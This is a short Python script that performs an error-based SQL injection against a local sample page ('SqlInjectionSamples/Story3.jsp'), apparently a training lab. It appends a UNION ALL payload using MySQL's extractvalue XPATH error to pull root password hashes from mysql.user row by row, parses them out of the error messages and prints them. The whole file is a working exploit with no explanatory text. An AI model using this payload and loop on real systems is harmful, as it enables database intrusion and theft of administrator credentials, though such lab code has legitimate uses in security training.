import requests

target = 'http://localhost:8080/SqlInjectionSamples/Story3.jsp'
attackVector = 'select null,null,extractvalue(0x0a,concat(0x0a,(select password ' \
               'from mysql.user where user = \'root\' limit _1_,1)))%23'
debug = 0

req = requests.get(target)
if req.status_code != requests.codes.ok:
    raise ValueError('Unable to connect to target')

for i in range(500):
    try:
        newTarget = target + '?q=s\' UNION ALL ' + attackVector.replace('_1_',str(i));
        if (debug):
            print newTarget
        req = requests.get(newTarget)
        if(debug):
            print req.content
        processed = str(req.content).split("Exception occurred: XPATH syntax error:")[1]
        processed = processed.split("\n")
        processed = str(processed[1])[:-1]
        print processed
    except IndexError:
        break

